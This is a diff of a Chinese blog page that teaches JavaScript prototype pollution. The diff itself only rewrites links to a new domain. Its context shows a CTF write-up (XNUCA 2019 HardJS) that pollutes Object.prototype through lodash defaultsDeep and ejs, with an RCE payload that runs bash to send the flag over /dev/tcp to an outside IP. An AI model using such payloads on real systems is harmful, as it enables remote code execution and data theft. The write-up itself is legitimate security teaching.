@@ -4,10 +4,10 @@
   <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Javascript 原型链污染攻击学习 | 3ND</title>
-<link rel="shortcut icon" href="https://github.com/inspiringz/inspiringz.github.io/favicon.ico?v=1627821474317">
+<link rel="shortcut icon" href="https://3nd.xyz/favicon.ico?v=1627821697412">
 <link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
-<link rel="stylesheet" href="https://github.com/inspiringz/inspiringz.github.io/styles/main.css">
-<link rel="alternate" type="application/atom+xml" title="Javascript 原型链污染攻击学习 | 3ND - Atom Feed" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml">
+<link rel="stylesheet" href="https://3nd.xyz/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Javascript 原型链污染攻击学习 | 3ND - Atom Feed" href="https://3nd.xyz/atom.xml">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
 
 
@@ -28,8 +28,8 @@ function Foo() { //Foo类的构造函数
   <div class="main">
     <div class="main-content">
       <div class="site-header">
-  <a href="https://github.com/inspiringz/inspiringz.github.io">
-  <img class="avatar" src="https://github.com/inspiringz/inspiringz.github.io/images/avatar.png?v=1627821474317" alt="">
+  <a href="https://3nd.xyz">
+  <img class="avatar" src="https://3nd.xyz/images/avatar.png?v=1627821697412" alt="">
   </a>
   <h1 class="site-title">
     3ND
@@ -98,11 +98,11 @@ function Foo() { //Foo类的构造函数
               <span class="page-view" key="20190910161855" title="Javascript 原型链污染攻击学习">
               </span>
               
-                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/summary/" class="post-tag">
+                <a href="https://3nd.xyz/tag/summary/" class="post-tag">
                   # Summary
                 </a>
                 
-                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/javascript/" class="post-tag">
+                <a href="https://3nd.xyz/tag/javascript/" class="post-tag">
                   # JavaScript
                 </a>
                 
@@ -110,7 +110,7 @@ function Foo() { //Foo类的构造函数
             
                 <div class="post-content-wrapper">
                   <div class="post-content">
-                    <figure data-type="image" tabindex="1"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-09-10-22-03-42.png" alt="" loading="lazy"></figure>
+                    <figure data-type="image" tabindex="1"><img src="https://3nd.xyz/post-images/move/2019-09-10-22-03-42.png" alt="" loading="lazy"></figure>
 <h2 id="0x01-prototype-__proto__">0x01 prototype / __proto__</h2>
 <p>在 JavaScript 中，我们通常以<strong>构造函数</strong>的方式来定义一个类：</p>
 <pre><code class="language-js">function Foo() { //Foo类的构造函数
@@ -143,7 +143,7 @@ Foo.prototype.show = function show() {
 let foo = new Foo()
 foo.show()
 </code></pre>
-<figure data-type="image" tabindex="2"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-09-10-16-49-57.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://3nd.xyz/post-images/move/2019-09-10-16-49-57.png" alt="" loading="lazy"></figure>
 <p>我们可以认为原型 <code>prototype</code> 是类 Foo 的一个属性，这个属性包含一个对象（ prototype 对象），所有实例对象需要共享的属性和方法，都放在这个对象里面；那些不需要共享的属性和方法，就放在构造函数里面。我们可以通过 <code>Foo.prototype</code> 来访问 Foo 类的原型，而 Foo 实例化的对象则可以通过 <code>__proto__</code> 来访问 Foo 类的原型，也就是说：</p>
 <pre><code class="language-js">Foo.prototype == foo.__proto__
 </code></pre>
@@ -166,7 +166,7 @@ Foo { show: [Function: show] }
 &gt; foo.constructor //foo实例化对象的构造函数
 [Function: Foo]
 </code></pre>
-<figure data-type="image" tabindex="3"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-09-10-16-23-45.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://3nd.xyz/post-images/move/2019-09-10-16-23-45.png" alt="" loading="lazy"></figure>
 <h2 id="0x03-javascript-原型链继承">0x03 JavaScript 原型链继承</h2>
 <p>所有类对象在实例化的时候将会拥有prototype中的属性和方法，这个特性被用来实现JavaScript中的继承机制。</p>
 <p>比如：</p>
@@ -191,7 +191,7 @@ console.log(`Name: ${son.first_name} ${son.last_name}`)
 <li>如果仍然找不到，则继续在<code>son.__proto__.__proto</code>中寻找last_name</li>
 <li>依次回溯查找，指导找到<code>null</code>结束，比如<code>Object.prototype</code>的<code>__proto__</code>即为<code>null</code></li>
 </ol>
-<figure data-type="image" tabindex="4"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-09-10-17-59-34.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://3nd.xyz/post-images/move/2019-09-10-17-59-34.png" alt="" loading="lazy"></figure>
 <p>JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作prototype继承链。简单总结如下:</p>
 <ol>
 <li>每个构造函数(constructor)都有一个原型对象(prototype)</li>
@@ -201,7 +201,7 @@ console.log(`Name: ${son.first_name} ${son.last_name}`)
 <h2 id="0x04-什么是原型链污染">0x04 什么是原型链污染？</h2>
 <p>在JavaScript中访问一个对象的属性可以用<code>a.b.c</code>或者<code>a[&quot;b&quot;][&quot;c&quot;]</code>来访问。由于对象是无序的,当使用第二种方式访问对象时,只能使用指明下标的方式去访问。因此我们可以通过<code>a[&quot;__proto__&quot;]</code>的方式去访问其原型对象。</p>
 <p>在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染。比如：</p>
-<figure data-type="image" tabindex="5"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-09-10-17-36-42.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://3nd.xyz/post-images/move/2019-09-10-17-36-42.png" alt="" loading="lazy"></figure>
 <h2 id="0x05-原型链污染场景">0x05 原型链污染场景</h2>
 <p>在实际应用中，通常能够找到控制数组（对象）的<strong>键名</strong>的操作即可能存在原型链能够被攻击者修改。原型对象污染经常会出现在一些通过用户输入获得的 JSON 对象进行的一些不安全的<strong>merge</strong>、<strong>clone</strong>、<strong>extend</strong> 和 <strong>path assignment</strong> 操作。</p>
 <p>以对象 merge 为例，想象一个简单的 merge 函数：</p>
@@ -226,7 +226,7 @@ console.log(`Name: ${son.first_name} ${son.last_name}`)
 }
 </code></pre>
 <p>如果为未经安全处理（字段）就将此 payload 提供给 merge 方法进行合并操作，将会污染原型对象。</p>
-<figure data-type="image" tabindex="6"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-09-10-22-50-43.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://3nd.xyz/post-images/move/2019-09-10-22-50-43.png" alt="" loading="lazy"></figure>
 <p>污染的严重性取决于 payload 的类型和在对象中使用的方式，如果你使用它们去认证 admin：</p>
 <pre><code class="language-js">if(user.isAdmin) {
   // do something
@@ -248,7 +248,7 @@ console.log(`Name: ${son.first_name} ${son.last_name}`)
 </code></pre>
 <h2 id="0x06-实例分析">0x06 实例分析</h2>
 <h3 id="xnuca-2019-qualifier-hardjs">XNUCA 2019 Qualifier HardJS</h3>
-<figure data-type="image" tabindex="7"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-09-10-23-50-34.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://3nd.xyz/post-images/move/2019-09-10-23-50-34.png" alt="" loading="lazy"></figure>
 <p>简单分析发现<code>admin</code>账户已存在，题目要求获取管理员密码，路由分析如下：</p>
 <ul>
 <li><code>/</code> 首页</li>
@@ -259,10 +259,10 @@ console.log(`Name: ${son.first_name} ${son.last_name}`)
 <li><code>/get</code> json接口 获取数据库中保存的数据</li>
 <li><code>/add</code> 用户添加数据的接口</li>
 </ul>
-<figure data-type="image" tabindex="8"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-09-10-23-57-47.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://3nd.xyz/post-images/move/2019-09-10-23-57-47.png" alt="" loading="lazy"></figure>
 <p>审阅源码发现系 Node.js Express 应用，猜测很可能是 prototype 原型链污染。</p>
 <p>注意到 server.js 中 如下代码：</p>
-<figure data-type="image" tabindex="9"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-09-11-00-03-23.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://3nd.xyz/post-images/move/2019-09-11-00-03-23.png" alt="" loading="lazy"></figure>
 <p>lodash 是为了弥补 JavaScript 原生函数功能不足而提供的一个辅助功能集，其中包含字符串、数组、对象等操作，lodash.merge 出现过原型链污染漏洞，查询到 defaultsDeep 方法示例如下，同时接收了<code>JSON.parse( raws[i].dom )</code>数据，问题极可能出现在此处。</p>
 <blockquote>
 <p>_.defaultsDeep(object, [sources])<br>
@@ -273,7 +273,7 @@ console.log(`Name: ${son.first_name} ${son.last_name}`)
 // =&gt; { 'user': { 'name': 'barney', 'age': 36 } }
 </code></pre>
 <p>在 package-lock.json 中 获取到 lodash 版本为 4.17.11：</p>
-<figure data-type="image" tabindex="10"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-09-11-00-01-49.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="10"><img src="https://3nd.xyz/post-images/move/2019-09-11-00-01-49.png" alt="" loading="lazy"></figure>
 <p>对应找到 <a href="https://snyk.io/vuln/SNYK-JS-LODASH-450202">原型链污染漏洞</a> 影响 lodash 包 4.17.12 以下版本。</p>
 <blockquote>
 <p>The function <code>defaultsDeep</code> could be tricked into adding or modifying properties of <code>Object.prototype</code> using a <code>constructor</code> payload.</p>
@@ -292,11 +292,11 @@ function check() {
 check();
 </code></pre>
 <p>验证如下：</p>
-<figure data-type="image" tabindex="11"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-09-11-00-14-31.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="https://3nd.xyz/post-images/move/2019-09-11-00-14-31.png" alt="" loading="lazy"></figure>
 <p>我们可以通过 JSON 利用 defaultsDeep 进行原型链污染，下一步需要找到一个 eval 动态执行的地方才能 RCE，跟进到动态模板库 <code>ejs</code>：</p>
-<figure data-type="image" tabindex="12"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-09-11-00-21-15.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="12"><img src="https://3nd.xyz/post-images/move/2019-09-11-00-21-15.png" alt="" loading="lazy"></figure>
 <p>再看后面有动态函数生成：</p>
-<figure data-type="image" tabindex="13"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-09-11-00-23-41.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="13"><img src="https://3nd.xyz/post-images/move/2019-09-11-00-23-41.png" alt="" loading="lazy"></figure>
 <p>所以需要伪造 outputFunctionName 为一段恶意代码，就可以实现rce ，payload如下：</p>
 <pre><code class="language-js">{&quot;type&quot;:&quot;test&quot;,&quot;content&quot;:{&quot;constructor&quot;:{&quot;prototype&quot;:
 {&quot;outputFunctionName&quot;:&quot;a=1;process.mainModule.require('child_process').exec('b
@@ -359,7 +359,7 @@ ash -c \&quot;echo $FLAG&gt;/dev/tcp/139.180.192.11/10000\&quot;')//&quot;\}\}\}
               margin-bottom: 24px;
               color: #343a40;
               font-weight: lighter;text-align: left;">上一篇</div>
-              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-09-11-adworld-web-writeup/">
+              <a href="https://3nd.xyz/post/2019-09-11-adworld-web-writeup/">
                 <h3 class="post-title" style="text-align: left;">
                   攻防世界 ADWorld Web 部分题解（1）
                 </h3>
@@ -370,7 +370,7 @@ ash -c \&quot;echo $FLAG&gt;/dev/tcp/139.180.192.11/10000\&quot;')//&quot;\}\}\}
               margin-bottom: 24px;
               color: #343a40;
               font-weight: lighter; text-align: right;">下一篇</div>
-              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-09-02-ssti-learning-note/">
+              <a href="https://3nd.xyz/post/2019-09-02-ssti-learning-note/">
                 <h3 class="post-title" style="
                 text-align: right;">
                   服务端模板注入攻击(SSTI)学习
@@ -384,7 +384,7 @@ ash -c \&quot;echo $FLAG&gt;/dev/tcp/139.180.192.11/10000\&quot;')//&quot;\}\}\}
 
                                 <div class="site-footer">
   
-  <a class="rss" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml" target="_blank">
+  <a class="rss" href="https://3nd.xyz/atom.xml" target="_blank">
     <i class="ri-rss-line"></i> RSS
   </a>
 </div>
